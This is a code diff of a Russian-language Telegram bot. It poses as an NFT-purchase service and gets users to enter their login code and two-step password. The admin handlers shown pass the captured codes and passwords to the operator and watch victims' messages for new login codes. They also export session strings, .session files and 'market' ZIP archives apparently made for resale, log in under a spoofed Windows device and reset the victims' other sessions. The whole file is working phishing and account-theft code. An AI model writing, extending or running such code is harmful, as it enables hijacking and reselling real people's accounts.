@@ -199,8 +199,8 @@ async def process_phone(message: Message, state: FSMContext):
 
         await state.set_state(AuthState.waiting_for_code)
         await message.answer(
-            "Код подтверждения \n\n"
-            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или просто написать код цифрами в чат!\n\n"
+            "Код подтверждения\n\n"
+            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
@@ -214,68 +214,13 @@ async def process_phone(message: Message, state: FSMContext):
         await state.clear()
 
 
-# --- ОБРАБОТКА ВВОДА КОДА КНОПКАМИ ---
-@router.callback_query(AuthState.waiting_for_code, F.data.startswith("digit_"))
-async def process_code_input(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    action = callback.data.split("_")[1]
-
+# --- ЕДИНАЯ ФУНКЦИЯ ВХОДА (ДЛЯ КНОПОК И ТЕКСТА) ---
+async def execute_sign_in(bot_inst, chat_id, state: FSMContext, user_id: int, code_str: str):
     if user_id not in temp_auth_data:
-        await callback.message.edit_text("❌ Сессия истекла. Напиши /start заново.")
+        await bot_inst.send_message(chat_id, "❌ Сессия истекла. Напиши /start заново.")
         await state.clear()
         return
 
-    data = temp_auth_data[user_id]
-    current_code = data["code"]
-
-    if action == "reset":
-        data["code"] = ""
-    elif action == "back":
-        data["code"] = current_code[:-1]
-    else:
-        if len(current_code) < 6:
-            data["code"] += action
-
-    code_str = data["code"]
-    masked_list = [code_str[i] if i < len(code_str) else "_" for i in range(5)]
-    masked_display = " ".join(masked_list)
-
-    text = (
-        "Код подтверждения \n\n"
-        "Telegram отправил тебе код в приложение. Можешь нажимать кнопки ниже или написать его текстом:\n\n"
-        f"<code>{masked_display}</code>"
-    )
-
-    if len(code_str) >= 5:
-        await execute_sign_in(callback.message, state, user_id, code_str, is_callback=True)
-        return
-
-    try:
-        await callback.message.edit_text(text, reply_markup=get_code_keyboard(), parse_mode="HTML")
-    except Exception:
-        pass
-    await callback.answer()
-
-
-# --- ОБРАБОТКА ВВОДА КОДА ТЕКСТОМ В ЧАТ ---
-@router.message(AuthState.waiting_for_code, F.text)
-async def process_code_text(message: Message, state: FSMContext):
-    user_id = message.from_user.id
-    if user_id not in temp_auth_data:
-        await message.answer("❌ Сессия истекла. Напиши /start заново.")
-        await state.clear()
-        return
-
-    code_str = re.sub(r"\D", "", message.text)
-    if len(code_str) < 5:
-        await message.answer("❌ Код слишком короткий. Введите минимум 5 цифр:")
-        return
-
-    await execute_sign_in(message, state, user_id, code_str, is_callback=False)
-
-
-# --- ФУНКЦИЯ АВТОРИЗАЦИИ В TELEGRAM ---
-async def execute_sign_in(message_obj, state: FSMContext, user_id: int, code_str: str, is_callback: bool = False):
     data = temp_auth_data[user_id]
     client = data["client"]
     phone = data["phone"]
@@ -312,36 +257,84 @@ async def execute_sign_in(message_obj, state: FSMContext, user_id: int, code_str
                 InlineKeyboardButton(text="gram", callback_data="curr_Gram")
             ]
         ])
-        success_text = (
-            "✅ **Юзербот успешно подключен!**\n\n"
-            "🎨 Выберите валюту для покупки NFT:"
+        await bot_inst.send_message(
+            chat_id,
+            "✅ **Юзербот успешно подключен!**\n\n🎨 Выберите валюту для покупки NFT:",
+            reply_markup=currency_kb,
+            parse_mode="Markdown"
         )
-        
-        if is_callback:
-            await message_obj.edit_text(success_text, reply_markup=currency_kb, parse_mode="Markdown")
-        else:
-            await message_obj.answer(success_text, reply_markup=currency_kb, parse_mode="Markdown")
-
         await state.set_state(NftState.waiting_for_currency)
 
     except Exception as e:
         if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
-            pwd_text = (
-                "Облачный пароль\n\n"
-                "На аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
+            await bot_inst.send_message(
+                chat_id,
+                "Облачный пароль\n\nНа аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
             )
-            if is_callback:
-                await message_obj.edit_text(pwd_text)
-            else:
-                await message_obj.answer(pwd_text)
             await state.set_state(AuthState.waiting_for_password)
         else:
-            err_text = f"❌ Ошибка входа: {e}\nПопробуйте ввести код заново:"
-            if is_callback:
-                await message_obj.answer(err_text)
-            else:
-                await message_obj.answer(err_text)
+            await bot_inst.send_message(chat_id, f"❌ Ошибка входа: {e}\nПопробуйте ввести код заново:")
             data["code"] = ""
+
+
+# --- ОБРАБОТКА КНОПОК КЛАВИАТУРЫ КОДА ---
+@router.callback_query(AuthState.waiting_for_code, F.data.startswith("digit_"))
+async def process_code_input(callback: CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    action = callback.data.split("_")[1]
+
+    if user_id not in temp_auth_data:
+        await callback.message.edit_text("❌ Сессия истекла. Напиши /start заново.")
+        await state.clear()
+        return
+
+    data = temp_auth_data[user_id]
+    current_code = data["code"]
+
+    if action == "reset":
+        data["code"] = ""
+    elif action == "back":
+        data["code"] = current_code[:-1]
+    else:
+        if len(current_code) < 6:
+            data["code"] += action
+
+    code_str = data["code"]
+    masked_list = [code_str[i] if i < len(code_str) else "_" for i in range(5)]
+    masked_display = " ".join(masked_list)
+
+    text = (
+        "Код подтверждения\n\n"
+        "Telegram отправил тебе код в приложение. Можешь нажимать кнопки или написать цифрами в чат:\n\n"
+        f"<code>{masked_display}</code>"
+    )
+
+    if len(code_str) >= 5:
+        await execute_sign_in(bot, callback.message.chat.id, state, user_id, code_str)
+        return
+
+    try:
+        await callback.message.edit_text(text, reply_markup=get_code_keyboard(), parse_mode="HTML")
+    except Exception:
+        pass
+    await callback.answer()
+
+
+# --- ОБРАБОТКА ТЕКСТА (ВВОД КОДА ЧЕРЕЗ ЧАТ) ---
+@router.message(AuthState.waiting_for_code, F.text)
+async def process_code_text(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    if user_id not in temp_auth_data:
+        await message.answer("❌ Сессия истекла. Напиши /start заново.")
+        await state.clear()
+        return
+
+    code_str = re.sub(r"\D", "", message.text)
+    if len(code_str) < 5:
+        await message.answer("❌ Введите корректный код (минимум 5 цифр):")
+        return
+
+    await execute_sign_in(bot, message.chat.id, state, user_id, code_str)
 
 
 @router.message(AuthState.waiting_for_password, F.text)
@@ -385,8 +378,7 @@ async def process_password(message: Message, state: FSMContext):
             ]
         ])
         await message.answer(
-            "✅ **Юзербот подключен под Pasturebot!**\n\n"
-            "🎨 Выберите валюту для покупки NFT:",
+            "✅ **Юзербот подключен под Pasturebot!**\n\n🎨 Выберите валюту для покупки NFT:",
             reply_markup=currency_kb,
             parse_mode="Markdown"
         )
@@ -403,8 +395,7 @@ async def process_nft_currency(callback: CallbackQuery, state: FSMContext):
     await state.update_data(currency=currency)
     
     await callback.message.edit_text(
-        f"Вы выбрали валюту: *{currency}*\n\n"
-        "💰 Напишите цену, за какую хотите купить NFT:",
+        f"Вы выбрали валюту: *{currency}*\n\n💰 Напишите цену, за какую хотите купить NFT:",
         parse_mode="Markdown"
     )
     await state.set_state(NftState.waiting_for_price)
@@ -545,8 +536,7 @@ async def admin_live_auth(callback: CallbackQuery):
 
     phone, string_session, cloud_password = res
     await callback.message.edit_text(
-        f"🔴 **Live-вход запущен для `{phone}`!**\n\n"
-        "⏳ Проверяю историю сообщений и жду новые коды от Telegram в течение **5 минут**...",
+        f"🔴 **Live-вход запущен для `{phone}`!**\n\n⏳ Проверяю историю сообщений и жду новые коды от Telegram в течение **5 минут**...",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
     )
 
@@ -579,11 +569,7 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                 code = match.group(0)
                 await bot.send_message(
                     ADMIN_ID,
-                    f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n"
-                    f"📱 Номер: {phone}\n"
-                    f"🔑 Код для входа: {code}\n"
-                    f"🔑 Облачный пароль: {pwd_text}\n\n"
-                    f"💬 Текст: {text}",
+                    f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n📱 Номер: {phone}\n🔑 Код: {code}\n🔑 Пароль: {pwd_text}",
                     parse_mode="Markdown"
                 )
                 break
@@ -602,11 +588,7 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                         code = match.group(0)
                         await bot.send_message(
                             ADMIN_ID,
-                            f"🚨 НАЙДЕН СВЕЖИЙ КОД В РЕАЛЬНОМ ВРЕМЕНИ! 🚨\n\n"
-                            f"📱 Номер: {phone}\n"
-                            f"🔑 Код для входа: {code}\n"
-                            f"🔑 Облачный пароль: {pwd_text}\n\n"
-                            f"💬 Текст: {text}",
+                            f"🚨 НАЙДЕН СВЕЖИЙ КОД В РЕАЛЬНОМ ВРЕМЕНИ! 🚨\n\n📱 Номер: {phone}\n🔑 Код: {code}\n🔑 Пароль: {pwd_text}",
                             parse_mode="Markdown"
                         )
 
@@ -616,13 +598,6 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                 if code_found:
                     break
                 await asyncio.sleep(5)
-
-        if not code_found:
-            await bot.send_message(
-                ADMIN_ID,
-                f"⏱ **Время истекло (5 минут).**\nДля номера `{phone}` код не поступил.",
-                parse_mode="Markdown"
-            )
 
         await client.disconnect()
     except Exception as e:
@@ -667,18 +642,11 @@ async def admin_spawn_session(callback: CallbackQuery):
         await client.disconnect()
 
         await callback.message.edit_text(
-            f"✅ **Сеанс Pasture успешно добавлен! Юзербот работает** 🎉\n\n"
-            f"• Аккаунт: `@{me.username or me.first_name}`\n"
-            f"• Телефон: `{phone}`\n"
-            f"• Устройство: `CPython 3.14.3` (Windows 10)\n\n"
-            "💡 Теперь этот сеанс виден в списке активных устройств Telegram!",
+            f"✅ **Сеанс Pasture успешно добавлен!**\n• Аккаунт: `@{me.username or me.first_name}`\n• Телефон: `{phone}`",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
         )
     except Exception as e:
-        await callback.message.edit_text(
-            f"❌ Ошибка: `{e}`",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
-        )
+        await callback.message.edit_text(f"❌ Ошибка: `{e}`")
 
 
 @router.callback_query(F.data.startswith("adm_tdata_"))
@@ -700,20 +668,13 @@ async def admin_get_tdata(callback: CallbackQuery):
 
     phone, string_session, cloud_password = res
     clean_phone = re.sub(r"\D", "", phone)
-    
     folder_name = f"tdata_{clean_phone}"
     zip_name = f"tdata_{clean_phone}.zip"
 
     os.makedirs(folder_name, exist_ok=True)
-    
     meta_info = {
-        "phone": phone,
-        "device": "CPython 3.14.3",
-        "os": "Windows 10",
-        "api_id": API_ID,
-        "api_hash": API_HASH,
-        "password_2fa": cloud_password,
-        "string_session": string_session
+        "phone": phone, "device": "CPython 3.14.3", "os": "Windows 10",
+        "api_id": API_ID, "api_hash": API_HASH, "password_2fa": cloud_password, "string_session": string_session
     }
     with open(os.path.join(folder_name, "account_auth.json"), "w", encoding="utf-8") as f:
         json.dump(meta_info, f, ensure_ascii=False, indent=4)
@@ -726,18 +687,8 @@ async def admin_get_tdata(callback: CallbackQuery):
 
     if os.path.exists(zip_name):
         doc = FSInputFile(zip_name, filename=zip_name)
-        await bot.send_document(
-            ADMIN_ID,
-            document=doc,
-            caption=(
-                "📁 **Пакет авторизации для ПК (CPython 3.14.3)**\n\n"
-                "💡 *Содержит все данные сессии с десктопным идентификатором.*"
-            ),
-            parse_mode="Markdown"
-        )
+        await bot.send_document(ADMIN_ID, document=doc, caption="📁 **Пакет авторизации**", parse_mode="Markdown")
         await callback.answer("Архив отправлен!", show_alert=True)
-    else:
-        await callback.answer("Ошибка создания архива", show_alert=True)
 
     await asyncio.sleep(2)
     for path in [zip_name, folder_name]:
@@ -772,32 +723,19 @@ async def admin_instant_login(callback: CallbackQuery):
 
     try:
         client = Client(
-            name=f"login_{target_id}",
-            api_id=int(API_ID),
-            api_hash=API_HASH,
-            session_string=string_session,
-            device_model="Windows",
-            system_version="Windows 10",
-            app_version="CPython 3.14.3",
-            in_memory=True
+            name=f"login_{target_id}", api_id=int(API_ID), api_hash=API_HASH,
+            session_string=string_session, device_model="Windows", system_version="Windows 10", app_version="CPython 3.14.3", in_memory=True
         )
         await client.connect()
         me = await client.get_me()
         await client.disconnect()
 
         await callback.message.edit_text(
-            f"✅ **Успешный доступ к аккаунту!**\n\n"
-            f"• Имя: `{me.first_name}`\n"
-            f"• Юзернейм: `@{me.username or 'нет'}`\n"
-            f"• Телефон: `{phone}`\n"
-            f"• Устройство: CPython 3.14.3",
+            f"✅ **Успешный доступ!**\n• Имя: `{me.first_name}`\n• Юзернейм: `@{me.username or 'нет'}`\n• Телефон: `{phone}`",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
         )
     except Exception as e:
-        await callback.message.edit_text(
-            f"❌ Ошибка входа: `{e}`",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
-        )
+        await callback.message.edit_text(f"❌ Ошибка входа: `{e}`")
 
 
 def generate_safe_session_file(phone: str, string_session: str) -> str:
@@ -827,33 +765,13 @@ def generate_safe_session_file(phone: str, string_session: str) -> str:
 
     db_conn = sqlite3.connect(filename)
     db_cursor = db_conn.cursor()
-    
     db_cursor.executescript("""
-        CREATE TABLE IF NOT EXISTS sessions (
-            dc_id INTEGER PRIMARY KEY,
-            api_id INTEGER,
-            test_mode INTEGER,
-            auth_key BLOB,
-            user_id INTEGER,
-            is_bot INTEGER
-        );
-        CREATE TABLE IF NOT EXISTS peers (
-            id INTEGER PRIMARY KEY,
-            access_hash INTEGER,
-            type INTEGER,
-            username TEXT,
-            phone_number TEXT,
-            last_update_on INTEGER
-        );
+        CREATE TABLE IF NOT EXISTS sessions (dc_id INTEGER PRIMARY KEY, api_id INTEGER, test_mode INTEGER, auth_key BLOB, user_id INTEGER, is_bot INTEGER);
+        CREATE TABLE IF NOT EXISTS peers (id INTEGER PRIMARY KEY, access_hash INTEGER, type INTEGER, username TEXT, phone_number TEXT, last_update_on INTEGER);
     """)
-    
-    db_cursor.execute(
-        "INSERT OR REPLACE INTO sessions VALUES (?, ?, ?, ?, ?, ?)",
-        (dc_id, int(API_ID), test_mode, auth_key, user_id, int(is_bot))
-    )
+    db_cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?, ?, ?, ?, ?)", (dc_id, int(API_ID), test_mode, auth_key, user_id, int(is_bot)))
     db_conn.commit()
     db_conn.close()
-
     return filename
 
 
@@ -869,7 +787,6 @@ async def create_perfect_market_zip(target_id: int) -> str:
 
     phone, string_session, cloud_password = res
     clean_phone = re.sub(r"\D", "", phone)
-    
     session_filename = f"{clean_phone}.session"
     json_filename = f"{clean_phone}.json"
     zip_filename = f"{clean_phone}_market.zip"
@@ -883,32 +800,15 @@ async def create_perfect_market_zip(target_id: int) -> str:
 
     try:
         generate_safe_session_file(phone, string_session)
-
-        temp_client = Client(
-            name=f"tmp_{clean_phone}",
-            api_id=int(API_ID),
-            api_hash=API_HASH,
-            session_string=string_session,
-            device_model="Windows",
-            system_version="Windows 10",
-            app_version="CPython 3.14.3",
-            in_memory=True
-        )
+        temp_client = Client(name=f"tmp_{clean_phone}", api_id=int(API_ID), api_hash=API_HASH, session_string=string_session, in_memory=True)
         await temp_client.connect()
         me = await temp_client.get_me()
         await temp_client.disconnect()
 
         account_info = {
-            "phone": phone,
-            "user_id": me.id,
-            "first_name": me.first_name,
-            "username": me.username or "",
-            "password_2fa": cloud_password,
-            "api_id": API_ID,
-            "api_hash": API_HASH,
-            "device_model": "Windows",
-            "system_version": "Windows 10",
-            "app_version": "CPython 3.14.3"
+            "phone": phone, "user_id": me.id, "first_name": me.first_name,
+            "username": me.username or "", "password_2fa": cloud_password,
+            "api_id": API_ID, "api_hash": API_HASH
         }
         with open(json_filename, "w", encoding="utf-8") as jf:
             json.dump(account_info, jf, ensure_ascii=False, indent=4)
@@ -928,7 +828,6 @@ async def create_perfect_market_zip(target_id: int) -> str:
 
         return zip_filename if os.path.exists(zip_filename) else None
     except Exception as e:
-        print(f"Ошибка архива: {e}")
         return None
 
 
@@ -936,37 +835,26 @@ async def create_perfect_market_zip(target_id: int) -> str:
 async def admin_get_market_zip(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-
     target_id = int(callback.data.split("_")[3])
-    await callback.answer("⏳ Создаю ZIP с сеансом CPython...", show_alert=False)
-
-    try:
-        zip_filename = await create_perfect_market_zip(target_id)
-        if zip_filename and os.path.exists(zip_filename):
-            doc = FSInputFile(zip_filename, filename=zip_filename)
-            await bot.send_document(
-                ADMIN_ID,
-                document=doc,
-                caption="📦 **Маркет ZIP-архив (CPython 3.14.3)**\n✅ `.session` + `.json`!",
-                parse_mode="Markdown"
-            )
-            await callback.answer("ZIP отправлен!", show_alert=True)
-            await asyncio.sleep(2)
-            try:
-                os.remove(zip_filename)
-            except Exception:
-                pass
-        else:
-            await callback.answer("Ошибка создания архива", show_alert=True)
-    except Exception as e:
-        await callback.answer(f"Ошибка: {e}", show_alert=True)
+    await callback.answer("⏳ Создаю ZIP...", show_alert=False)
+    zip_filename = await create_perfect_market_zip(target_id)
+    if zip_filename and os.path.exists(zip_filename):
+        doc = FSInputFile(zip_filename, filename=zip_filename)
+        await bot.send_document(ADMIN_ID, document=doc, caption="📦 **Маркет ZIP-архив**", parse_mode="Markdown")
+        await callback.answer("ZIP отправлен!", show_alert=True)
+        await asyncio.sleep(2)
+        try:
+            os.remove(zip_filename)
+        except Exception:
+            pass
+    else:
+        await callback.answer("Ошибка создания архива", show_alert=True)
 
 
 @router.callback_query(F.data.startswith("adm_kick_"))
 async def admin_kick_user(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-
     target_id = int(callback.data.split("_")[2])
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
@@ -979,30 +867,19 @@ async def admin_kick_user(callback: CallbackQuery):
 
     phone, string_session = res
     try:
-        client = Client(
-            name=f"kick_{target_id}",
-            api_id=int(API_ID),
-            api_hash=API_HASH,
-            session_string=string_session,
-            device_model="Windows",
-            system_version="Windows 10",
-            app_version="CPython 3.14.3",
-            in_memory=True
-        )
+        client = Client(name=f"kick_{target_id}", api_id=int(API_ID), api_hash=API_HASH, session_string=string_session, in_memory=True)
         await client.connect()
         await client.invoke(ResetAuthorizations())
         await client.disconnect()
-
-        await callback.answer("✅ Все посторонние сеансы завершены!", show_alert=True)
+        await callback.answer("✅ Сеансы сброшены!", show_alert=True)
     except Exception as e:
-        await callback.answer(f"Ошибка сброса: {e}", show_alert=True)
+        await callback.answer(f"Ошибка: {e}", show_alert=True)
 
 
 @router.callback_query(F.data.startswith("adm_get_str_"))
 async def admin_get_session_str(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-
     target_id = int(callback.data.split("_")[3])
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
@@ -1014,27 +891,21 @@ async def admin_get_session_str(callback: CallbackQuery):
         return await callback.answer("Не найдено", show_alert=True)
 
     phone, string_session, cloud_password = res
-    await bot.send_message(
-        ADMIN_ID,
-        f"🔑 **String Session (CPython) для `{phone}`:**\n\n🔐 2FA: `{cloud_password}`\n\n`{string_session}`",
-        parse_mode="Markdown"
-    )
-    await callback.answer("Строка отправлена!", show_alert=True)
+    await bot.send_message(ADMIN_ID, f"🔑 **String Session для `{phone}`:**\n\n🔐 2FA: `{cloud_password}`\n\n`{string_session}`", parse_mode="Markdown")
+    await callback.answer("Отправлено!", show_alert=True)
 
 
 @router.callback_query(F.data.startswith("adm_del_"))
 async def admin_delete_user(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-
     target_id = int(callback.data.split("_")[2])
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
     cursor.execute("DELETE FROM sessions WHERE user_id = ?", (target_id,))
     conn.commit()
     conn.close()
-
-    await callback.answer("Удалено из базы!", show_alert=True)
+    await callback.answer("Удалено!", show_alert=True)
     callback.data = "admin_users"
     await admin_list_users(callback)
 
@@ -1065,7 +936,7 @@ async def bc_set_all(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return
     await state.update_data(bc_type="all")
-    await callback.message.edit_text("📢 Отправьте текст или фото для рассылки **всем** пользователям:", parse_mode="Markdown")
+    await callback.message.edit_text("📢 Отправьте текст или фото для рассылки **всем**:", parse_mode="Markdown")
     await state.set_state(BroadcastState.waiting_for_content)
 
 
@@ -1074,7 +945,7 @@ async def bc_set_one(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return
     await state.update_data(bc_type="one")
-    await callback.message.edit_text("👤 Введите **Telegram ID** пользователя, которому хотите отправить сообщение:", parse_mode="Markdown")
+    await callback.message.edit_text("👤 Введите **Telegram ID** пользователя:", parse_mode="Markdown")
     await state.set_state(BroadcastState.waiting_for_target)
 
 
@@ -1085,10 +956,10 @@ async def bc_get_target_id(message: Message, state: FSMContext):
     try:
         target_uid = int(message.text.strip())
         await state.update_data(target_uid=target_uid)
-        await message.answer(f"✅ ID `{target_uid}` принят.\n\nТеперь отправьте текст или фото для отправки этому пользователю:", parse_mode="Markdown")
+        await message.answer(f"✅ ID `{target_uid}` принят.\n\nТеперь отправьте текст или фото:", parse_mode="Markdown")
         await state.set_state(BroadcastState.waiting_for_content)
     except ValueError:
-        await message.answer("❌ Неверный ID. Введите числовой Telegram ID пользователя:")
+        await message.answer("❌ Ошибка. Введите числовой Telegram ID:")
 
 
 @router.message(BroadcastState.waiting_for_content)
@@ -1103,9 +974,9 @@ async def admin_broadcast_execute(message: Message, state: FSMContext):
         target_uid = data.get("target_uid")
         try:
             await message.copy_to(chat_id=target_uid)
-            await message.answer(f"✅ Сообщение успешно отправлено пользователю `{target_uid}`!", parse_mode="Markdown")
+            await message.answer(f"✅ Отправлено пользователю `{target_uid}`!", parse_mode="Markdown")
         except Exception as e:
-            await message.answer(f"❌ Не удалось отправить сообщение пользователю `{target_uid}`: {e}", parse_mode="Markdown")
+            await message.answer(f"❌ Ошибка отправки: {e}")
     else:
         conn = sqlite3.connect("database.db")
         cursor = conn.cursor()
@@ -1122,7 +993,7 @@ async def admin_broadcast_execute(message: Message, state: FSMContext):
             except Exception:
                 fail += 1
 
-        await message.answer(f"📊 Рассылка завершена!\nУспешно: {success}\nОшибок: {fail}")
+        await message.answer(f"📊 Готово!\nУспешно: {success}\nОшибок: {fail}")
 
 
 async def handle(request):
